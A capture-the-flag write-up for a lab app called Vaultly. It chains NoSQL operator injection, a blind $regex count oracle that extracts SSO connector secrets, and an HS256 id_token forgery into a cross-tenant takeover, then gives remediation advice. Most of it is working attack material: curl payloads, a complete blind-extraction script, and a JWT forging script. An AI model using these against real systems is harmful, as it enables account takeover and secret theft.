---
title: Vaultly - NoSQL Operator Injection to Cross-Org SSO Takeover
tags:
  - bugforge
  - nosql
  - nosql-injection
  - mongodb
  - sso
  - oidc
  - jwt
  - blind-injection
  - info-disclosure
  - privilege-escalation
  - chain
  - nextjs
aliases:
  - "/bugforge/vaultly-nosql-sso-hijack/"
  - "/BugForge/Vaultly---NoSQL-Operator-Injection-to-SSO-Takeover"
---
- Vaultly weekly again - the multi-tenant "secure document vault for teams" on Next.js App Router
- The hint this week: "You don't need SQL." - the connector directory search on the SSO settings page runs a client-supplied Mongo-style filter verbatim
- The full chain: operator injection dumps the GLOBAL directory across both tenants, a blind `$regex` oracle against a hidden field extracts every org's SSO connector secret, the secret turns out to BE the id_token signing key, and a forged HQ token walks straight into the flag org and reads the break-glass recovery key
- No credentials, no brute force, no SQL - about 560 requests total

## Enumeration

### Application Fingerprinting

- Next.js App Router, fully server-rendered - `pentest-init-flow` found zero API endpoints in the framework JS because there is almost no client JS. Forms in the page HTML are the endpoint map
- Session auth via the `vaultly_session` cookie (HttpOnly, Secure, SameSite=lax)
- Login and register are form-encoded, NOT JSON
- Two tenants live in this build: `acme` and `vaultly-hq`

### Key Endpoints

| Method | Path | Auth | Notes |
|--------|------|------|-------|
| POST | /api/auth/register | none | `orgName`, `name`, `email`, `password` - creates an org and a session |
| POST | /api/auth/login | none | form-encoded `email`, `password`, `next` |
| POST | /api/auth/logout | session | - |
| POST | /api/vaults, /api/folders, /api/files | session | vault content management |
| POST | /api/files/import | session | import a file from a URL (SSRF candidate, not needed this time) |
| POST | /api/tokens, /api/apps, /api/members, /api/sso | session | API tokens, OAuth apps, member invites, SSO config |
| GET | /api/sso/oidc/start?org=acme | none | demo IdP mints an HS256 id_token and auto-POSTs it |
| POST | /api/sso/oidc/complete | none | verifies the id_token, issues a session |
| POST | /api/connectors/directory/query | session | **THE INJECTION** - takes a full Mongo filter object |
| GET | /api/hq/recovery | HQ ops role | **THE TARGET** - returns the break-glass recovery key |

- The `/login` page prints the demo accounts (`owner`, `admin`, `editor`, `viewer` `@acme.test`, password `vaultly`). Those get you into `acme` - the demo org. Useful for recon, useless for the flag

### The Wall

- `vaultly-hq` has no password login, no published accounts, and no demo identity provider:

```
GET /api/sso/oidc/start?org=vaultly-hq
404 - No demo identity provider is configured for this organization.
```

- So HQ identities can only enter through the SSO verification endpoint - `POST /api/sso/oidc/complete` - and that endpoint verifies a JWT signature
- The whole challenge therefore reduces to: **can you produce a token the verifier accepts?**

## Finding the Injection

- Most pages give up their endpoints through plain HTML forms. The exception was the SSO settings page: a typeahead input (`dir-q`) labeled "Connector directory - Look up existing identity-provider mappings" with no form around it and no visible JavaScript
- Next.js App Router hides client components in the RSC flight data. Grep the page HTML for the `I[...]` module references inside `self.__next_f.push` payloads:

```
4:I[9476,["245","static/chunks/app/settings/sso/page-de92b0cc3d9e0278.js"],"default"]
```

- That chunk is the typeahead's client code - fetch it. It contains exactly one `fetch()`:

```js
fetch("/api/connectors/directory/query", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    filter: { type: "mapping", displayName: { $regex: "^" + e } }
  })
})
```

- The client builds the ENTIRE filter object and the server runs it as-is. The typeahead can only send one shape - but the API will accept any shape you send. And the query is not scoped to your org

## The Directory Dump

Unanchor the regex and drop the `type` constraint:

```bash
curl -sk -X POST "$TARGET/api/connectors/directory/query" \
  -H "Content-Type: application/json" \
  -H "Cookie: vaultly_session=$SESSION" \
  -d '{"filter":{}}'
```

Seven entries, both tenants, from one request made with a fresh self-registered account:

```json
{
  "matched": true,
  "count": 7,
  "results": [
    { "type": "mapping",   "org": "vaultly-hq", "displayName": "Vaultly Ops", "email": "ops@vaultly.internal", "subject": "okta|ops" },
    { "type": "connector", "org": "vaultly-hq", "issuer": "https://id.vaultly.app", "clientId": "vid_8078abd4db15" },
    { "type": "mapping",   "org": "acme", "displayName": "Adam Reyes", "email": "admin@acme.test",  "subject": "auth0|admin" },
    { "type": "mapping",   "org": "acme", "displayName": "Victor Hale", "email": "viewer@acme.test", "subject": "auth0|viewer" },
    { "type": "connector", "org": "acme", "issuer": "https://id.vaultly.app", "clientId": "vid_722a5a1a5fd1" },
    { "type": "mapping",   "org": "acme", "displayName": "Olivia Stone", "email": "owner@acme.test",  "subject": "auth0|owner" },
    { "type": "mapping",   "org": "acme", "displayName": "Eve Lin", "email": "editor@acme.test", "subject": "auth0|editor" }
  ]
}
```

That is already a cross-tenant data exposure on its own - the org boundary exists in the UI, not in the query. But no secret anywhere in the response. The projection only returns display fields. Whatever the connector documents actually hold is hidden - from the RESPONSE. It is not hidden from the FILTER.

## The Blind Oracle

The response carries `matched` and `count`, and `count` is a boolean oracle for fields you cannot see. Calibrate it on a KNOWN field before trusting it on hidden ones:

| Filter | Count | Reads as |
|---|---|---|
| `{"type":"connector","clientId":{"$regex":"^vid_807"}}` | 1 | oracle live (positive control) |
| `{"type":"connector","clientId":{"$regex":"^zzz"}}` | 0 | oracle discriminates (negative control) |
| `{"type":"connector","clientSecret":{"$regex":""}}` | 0 | `clientSecret` does not exist |
| `{"type":"connector","secret":{"$regex":""}}` | 2 | **`secret` exists on every connector** |

Two things worth noticing:

- `$ne` is useless for field-existence probing: `{"filter":{"nonexistent":{"$ne":"x"}}}` matches all 7 documents, because a missing field compares "not equal" to everything. `$regex` on a missing field returns 0 - it is the probe that discriminates
- A hidden field is still a queryable field. Every connector document carries a `secret` that never appears in any response

Now the directory is not just a data exposure - it is a book you can read one character at a time.

## Extracting the Secrets

Binary search per character, scoped to one connector at a time by its `clientId`:

```python
# extract.py
import json, re, urllib.request

TARGET  = "https://lab-XXXX.labs-app.bugforge.io/api/connectors/directory/query"
SESSION = "<your vaultly_session>"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_!@#$%^&*()+=.,:;?/[]{}~`'\"|<>"

def count(fltr):
    body = json.dumps({"filter": fltr}).encode()
    req = urllib.request.Request(TARGET, data=body, headers={
        "Content-Type": "application/json",
        "Cookie": "vaultly_session=" + SESSION})
    return json.load(urllib.request.urlopen(req))["count"]

def extract(client_id):
    secret = ""
    while True:
        pre = {"type": "connector", "clientId": client_id}
        # at least one more character?
        if count({**pre, "secret": {"$regex": "^" + re.escape(secret) + "."}}) == 0:
            return secret
        lo, hi = 0, len(CHARSET)
        while hi - lo > 1:
            mid = (lo + hi) // 2
            pat = "^" + re.escape(secret) + "[" + re.escape(CHARSET[lo:mid]) + "]"
            if count({**pre, "secret": {"$regex": pat}}) > 0:
                hi = mid
            else:
                lo = mid
        c = CHARSET[lo]
        # confirm the singleton before committing to it
        if count({**pre, "secret": {"$regex": "^" + re.escape(secret) + re.escape(c)}}) == 0:
            raise SystemExit("char at position %d outside charset" % len(secret))
        secret += c
        print(client_id, "->", secret, flush=True)

print("acme:", extract("vid_722a5a1a5fd1"))
print("hq:  ", extract("vid_8078abd4db15"))
```

About seven queries per character, 32 characters per secret, roughly 260 requests each - a couple of minutes:

```
vid_722a5a1a5fd1 -> ea376158ddbe030b3c98d90ff42bf885
vid_8078abd4db15 -> 21eb583424ba6ab09c4cf9bf08d9a9d1
```

Two 32-character hex secrets, out of a response schema that never shows a single character of either.

## The Secret IS the Signing Key

Before attacking anything, confirm what the secret actually IS. The demo flow hands you a live `acme` token - verify the HMAC locally:

```bash
TOKEN=$(curl -sk "$TARGET/api/sso/oidc/start?org=acme" | grep -o 'value="[^"]*"' | cut -d'"' -f2)
python3 -c "import base64,sys; p=sys.argv[1].split('.')[1]; \
print(base64.urlsafe_b64decode(p+'='*(-len(p)%4)).decode())" "$TOKEN"
# {"email":"viewer@acme.test","iss":"https://id.vaultly.app",
#  "sub":"viewer@acme.test","aud":"acme","iat":...,"exp":...}
```

(The padding fix is not decoration - JWT segments are unpadded, and macOS `base64 -d` silently truncates the final characters without it.)

```python
# verify.py
import base64, hmac, hashlib, sys

h, p, s = sys.argv[1].split(".")
sig = base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
key = "ea376158ddbe030b3c98d90ff42bf885"   # the extracted acme connector secret
print("SIG MATCH:", hmac.new(key.encode(), (h + "." + p).encode(),
                              hashlib.sha256).digest() == sig)
```

```
SIG MATCH: True
```

The id_token verification key is the same secret sitting in the directory. Also worth pinning the verifier's strictness - all of these returned `401 Invalid identity token`:

- tampered payload with the stale signature
- `alg: none`
- HS256 header with an empty signature

No algorithm confusion needed, no signature bypass needed. The symmetric key itself was readable through the same injection that leaked the directory.

## Forging the HQ Identity

Everything the verifier needs is now in hand: the issuer and `aud` from the dumped connector, the identity claims from the dumped HQ mapping, and the signing key from the oracle. Build the token with the same claims shape the demo IdP uses:

```python
# forge.py
import base64, hmac, hashlib, json, time

def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()

HQ_SECRET = "21eb583424ba6ab09c4cf9bf08d9a9d1"
now = int(time.time())
payload = {
    "email": "ops@vaultly.internal",   # from the dumped HQ mapping
    "iss":   "https://id.vaultly.app", # the connector's issuer
    "sub":   "okta|ops",               # the mapping's subject
    "aud":   "vaultly-hq",             # the org slug
    "iat":   now,
    "exp":   now + 600,
}
h = b64e(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
p = b64e(json.dumps(payload).encode())
sig = hmac.new(HQ_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
print(h + "." + p + "." + b64e(sig))
```

```bash
TOKEN=$(python3 forge.py)
curl -sk -X POST "$TARGET/api/sso/oidc/complete" -d "id_token=$TOKEN" -D- -o /dev/null
```

```
HTTP/2 303
location: /dashboard
set-cookie: vaultly_session=<HQ session>; Path=/; Secure; HttpOnly; SameSite=lax
```

303 and a session. Full account takeover of the Vaultly HQ tenant, from a self-registered org, with zero credentials for any real user.

## The Flag

Walk the HQ vault like any other logged-in operator:

```bash
HQ="Cookie: vaultly_session=<forged session>"

curl -sk -H "$HQ" "$TARGET/dashboard" | grep -o "<h2[^>]*>[^<]*"
# Vaultly HQ

curl -sk -H "$HQ" "$TARGET/vaults/7?folder=12" | grep -o 'href="/api/files[^"]*"'
# /api/files/26?download=1

curl -sk -H "$HQ" "$TARGET/api/files/26?download=1"
```

```markdown
# Break-Glass Recovery

The emergency recovery key is retrievable by HQ operations staff via
`GET /api/hq/recovery`. Rotate the key after any use and record the incident here.
```

```bash
curl -sk -H "$HQ" "$TARGET/api/hq/recovery"
```

```json
{
  "org": "Vaultly HQ",
  "record": "break-glass",
  "recovery_key": "bug{uNAigxQHe2PYCFRPKgdsEI2eCGdlGwwX}",
  "note": "Emergency access key. Rotate after use."
}
```

**Flag: `bug{uNAigxQHe2PYCFRPKgdsEI2eCGdlGwwX}`**

## TL;DR - Speedrun

```bash
TARGET="https://lab-1788624626172-hdxy97.labs-app.bugforge.io"

# 1. Register any org -> session
curl -sk -X POST "$TARGET/api/auth/register" \
  -d 'orgName=Test&name=Op&email=op@op.test&password=opopopop11' \
  -c /tmp/c.txt -o /dev/null
SESSION=$(awk '/vaultly_session/{print $NF}' /tmp/c.txt)

# 2. Dump the GLOBAL directory with the injected filter
curl -sk -X POST "$TARGET/api/connectors/directory/query" \
  -H "Content-Type: application/json" -H "Cookie: vaultly_session=$SESSION" \
  -d '{"filter":{}}'
# -> org slugs, mappings (email/subject), connectors (issuer/clientId)

# 3. Blind-extract the connector secret for vaultly-hq (binary $regex search, ~260 reqs)
python3 extract.py    # -> 21eb583424ba6ab09c4cf9bf08d9a9d1

# 4. Forge the HQ id_token with that secret and complete SSO
TOKEN=$(python3 forge.py)
curl -sk -X POST "$TARGET/api/sso/oidc/complete" -d "id_token=$TOKEN" \
  -c /tmp/hq.txt -o /dev/null

# 5. Read the break-glass recovery key as HQ ops
curl -sk -b /tmp/hq.txt "$TARGET/api/hq/recovery"
```

## What Did Not Work

Honesty section - all of these were tried and ruled out before the chain above:

- Candidate-secret crack list (25 likely secrets: `vaultly`, `secret`, `changeme`, the client IDs, ...) against the demo token's HMAC - no hit. The secrets are 32-char hex, not a guessable word
- `alg: none`, empty signatures, stale signatures - all rejected. The verifier is strict; the bug was never the signature check
- `org` parameter tricks on `/api/sso/oidc/start` (`vaultly`, `hq`, null bytes, traversal) - all 404. The demo IdP genuinely only serves `acme`
- Field-existence probes for `flag`, `apiKey`, `signingKey`, `password` in the directory - all absent. Only `secret` exists, only on connectors

## Why This Worked

### Bug 1: The Filter Is the Query

The typeahead composes the whole Mongo filter object client-side and the server executes it verbatim - no operator stripping, no field allowlist, no schema validation. The UI can only ever send `{"type":"mapping","displayName":{"$regex":"^<input>"}}`, but the API accepts every shape. Combined with the complete absence of tenant scoping, one authenticated request reads every org's directory entries. The injection is not in a string that gets concatenated into a query - the injection IS the query.

- CWE-943: Improper Neutralization of Special Elements in Data Query Logic

### Bug 2: Projection Is Not Access Control

The response schema never includes `secret`. To every API client, every proxy log, and every casual inspector, the directory looks clean. But the query engine filters on fields the response does not render, and the `count` field turns any filter into a boolean oracle. Blind-extracting a 32-character key takes about 260 requests and under two minutes. Hiding a field from the response is a formatting decision; treating it as an authorization boundary is the vulnerability.

- CWE-200: Exposure of Sensitive Information

### Bug 3: The Client Secret Is the Signing Key

Vaultly verifies org SSO id_tokens with HMAC-SHA256 keyed by the connector's client secret. That means the secret stored in a queryable directory is also a token-forging key: directory read access is equivalent to signature forgery for every org. Symmetric signing always has this property - every holder of the key can mint tokens. Asymmetric signatures (IdP holds the private key, Vaultly verifies with a public key) would have made the extracted secret worthless for signatures and reduced this chain to an information disclosure.

### Bug 4: HQ Has No Other Front Door

`vaultly-hq` has no password login and no demo identity provider. The only entry for HQ identities is the SSO verification endpoint. So the entire security of the flag tenant reduces to "can you produce a signed token", which reduces to "can you read the signing key" - which the directory hands out one regex at a time.

## Key Insight: Confirm What a Secret IS Before Attacking What It Protects

The moment the extracted `acme` secret HMAC-matched the live demo token, the rest of the chain stopped being research and became arithmetic. Without that one local check, the 32 hex characters could have been anything - a display key, a webhook salt, a config artifact - and the HQ forge would have been guesswork. When you extract a secret, immediately test its most privileged possible role. It costs one request and it collapses the solution space.

The second portable lesson is oracle calibration: before using `count` to read a hidden field, prove on a KNOWN field that the oracle is live (positive control) and that it discriminates (negative control). An oracle that returns 2 for everything looks identical to an oracle that found your field.

## Security Takeaways

### Vulnerability

- NoSQL operator injection in `/api/connectors/directory/query`: client-supplied filter objects executed verbatim (CWE-943)
- Missing tenant isolation: the directory query returns all orgs' mappings and connectors to any session (CWE-284)
- Blind-extractable signing material: the id_token HMAC key lives in the same queryable store (CWE-200)

### Impact

- Full cross-tenant account takeover: any self-registered user can mint a valid SSO session for any mapped identity in any org
- Read of the HQ break-glass recovery key
- Full enumeration of org structure: member emails, SSO subjects, issuers, client IDs

### Root Cause

- Query structure trusted from the client - the API accepts operator objects, not just strings
- Response projection treated as the only barrier for secret data
- Symmetric signature key shared between the IdP configuration and the verifier, stored in a globally readable directory

### Remediation

- Accept a plain search STRING from the typeahead and build the filter server-side. If the API must accept structured filters, validate against a strict schema: allowlisted fields, scalar equality or containment only, operator objects rejected
- Scope every directory query to the caller's org id, server-side, unconditionally
- Move signing keys out of the directory store entirely. Prefer asymmetric id_token signatures (RS256/ES256) so no shared secret exists to steal
- Rate-limit and alert on the directory endpoint - 260 near-identical prefix queries from one session is loud, and nothing raised it
- Treat response projection as formatting, never as authorization. Any field that must stay secret must not be filterable
